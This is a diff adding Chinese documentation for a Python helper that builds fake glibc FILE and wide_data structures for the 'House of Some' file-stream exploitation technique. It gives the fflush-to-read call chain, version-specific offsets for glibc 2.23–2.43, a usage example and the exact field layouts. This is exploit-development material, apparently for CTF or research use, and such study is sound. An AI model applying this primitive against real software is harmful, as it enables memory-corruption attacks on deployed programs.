@@ -96,7 +96,132 @@ PoC 里的 `dlsym` 只是用来代替真实题目中的 libc 泄露和符号偏�
 
 ## Python 离线板子
 
-`some.py` 的 `build_house_of_some(version, file_addr, wide_addr, file_jumps_addr, wfile_jumps_addr, target_addr, target_length, fd, lock_addr, list_all_addr, prevchain_addr=None)` 生成第一跳 `read(fd, target, length)` 的 FILE/wide_data 镜像。`version` 选择 `+0x130/+0xf0/+0xe0`；2.40+ 必须传 `prevchain_addr`，通常为 `_IO_list_all` 槽地址。函数不负责链式 RWRWR、投递或触发。
+[`some.py`](./some.py) 提供 `build_house_of_some`，生成 Some 第一跳 `read(fd, target, length)` 的 FILE/wide_data 镜像。
+
+### 函数用途
+
+构造以下调用链所需的对象：
+
+```text
+fflush(NULL)
+  -> _IO_flush_all
+  -> _IO_wfile_overflow
+  -> _IO_wdoallocbuf
+  -> WDOALLOCATE(fp) = wide vtable + 0x68
+  -> (_IO_file_jumps - 0x48) + 0x68
+  -> _IO_file_jumps + 0x20 = _IO_new_file_underflow
+  -> _IO_file_read
+  -> read(fp->_fileno, target, length)
+```
+
+`fake wide_data->_wide_vtable = _IO_file_jumps - 0x48`，配合 doallocate 槽 `+0x68` 恰好落到 `_IO_file_jumps + 0x20`。
+
+### 对应 PoC
+
+- [`poc_2.23_2.29.c`](./poc_2.23_2.29.c)；
+- [`poc_2.30.c`](./poc_2.30.c)；
+- [`poc_2.31_2.43.c`](./poc_2.31_2.43.c)。
+
+### 版本与 ABI 偏移
+
+| glibc | `_wide_data->_wide_vtable` 偏移 |
+|---|---|
+| 2.23～2.29 | `+0x130` |
+| 2.30 | `+0xf0` |
+| 2.31～2.43 | `+0xe0` |
+
+2.40 起 `FILE+0xb8` 复用为 `_prevchain`，必须提供。
+
+### 最小使用示例
+
+```python
+from some import build_house_of_some
+
+writes = build_house_of_some(
+    "2.43",
+    file_addr=0x100000,          # fake FILE
+    wide_addr=0x200000,          # fake wide_data
+    file_jumps_addr=0x7fff0000,  # _IO_file_jumps
+    wfile_jumps_addr=0x7fff0100, # 合法 primary _IO_wfile_jumps
+    target_addr=0x300000,        # read 目标
+    target_length=0x40,
+    fd=3,                        # 输入 fd
+    lock_addr=0x400000,          # 可写锁区
+    list_all_addr=0x7fff0200,    # _IO_list_all 槽
+    prevchain_addr=0x7fff0200,   # 2.40+ 需要
+)
+
+# 两个 MemoryWrite：FILE 镜像、wide_data 镜像
+for w in writes:
+    print(w.label, hex(w.address), w.data.hex())
+```
+
+### 参数
+
+| 参数 | 含义 |
+|---|---|
+| `version` | 目标 glibc 版本，支持 `2.23`～`2.43`。 |
+| `file_addr` | fake FILE 地址。 |
+| `wide_addr` | fake `_IO_wide_data` 地址，写入 `FILE+0xa0`。 |
+| `file_jumps_addr` | 目标 libc 的 `_IO_file_jumps` 地址；用于计算 `file_jumps - 0x48`。 |
+| `wfile_jumps_addr` | 目标 libc 的 `_IO_wfile_jumps` 地址；作为合法 primary vtable 写入 `FILE+0xd8`。 |
+| `target_addr` | 第一跳 `read` 写入的目标地址。 |
+| `target_length` | 第一跳读取长度。 |
+| `fd` | 第一跳 `read` 使用的文件描述符。 |
+| `lock_addr` | fake FILE `_lock` 指向的可写锁区。 |
+| `list_all_addr` | `_IO_list_all` 槽地址，用于说明/校验链关系。 |
+| `prevchain_addr` | 2.40+ 必须提供 `_IO_list_all` 槽地址，写入 `FILE+0xb8`；通常等于 `list_all_addr`。 |
+
+### 返回对象
+
+返回两个 `MemoryWrite`。`MemoryWrite` 每个成员含义：
+
+| 成员 | 含义 |
+|---|---|
+| `address` | 要写入的绝对地址。 |
+| `data` | 要写入的小端字节串（`bytes`）。 |
+| `label` | 该写入的用途标签，用于调试和识别。 |
+
+各写入内容：
+
+```text
+FILE（file_addr 处，0xe0 字节）：
+    +0x00  _flags = IO_LINKED (0x80)
+    +0x18/+0x20/+0x28  _IO_read_base/_ptr/_end = target_addr
+    +0x30  _IO_write_end = target_addr + target_length
+    +0x38  _IO_buf_base = target_addr
+    +0x40  _IO_buf_end = target_addr + target_length
+    +0x70  _fileno = fd (4 字节)
+    +0x98  _codecvt = 0
+    +0xa0  _wide_data = wide_addr
+    +0xc0  _mode = 2
+    +0xd8  vtable = wfile_jumps_addr
+    +0xb8  _prevchain（仅 2.40+）
+
+wide_data（wide_addr 处，到版本槽位）：
+    +0x18  _IO_write_base = 0
+    +0x20  _IO_write_ptr = 1
+    +0x30  _IO_buf_base = 0
+    +版本槽  _wide_vtable = file_jumps_addr - 0x48
+```
+
+### 调用者必须提供
+
+```text
+libc 基址和 _IO_file_jumps/_IO_wfile_jumps 地址
+一次 libc 内指针写，把 fake FILE 挂到 _IO_list_all 或 _chain
+能触发 fflush(NULL)/exit 的入口
+2.40+ 的 _IO_list_all 地址
+```
+
+### 函数不负责
+
+```text
+不把 fake FILE 挂到 _IO_list_all
+不负责链式 RWRWR 的后续阶段
+不触发 fflush(NULL)
+不匹配 _IO_flush_all 的遍历顺序
+```
 
 ## 源码与原始资料
 
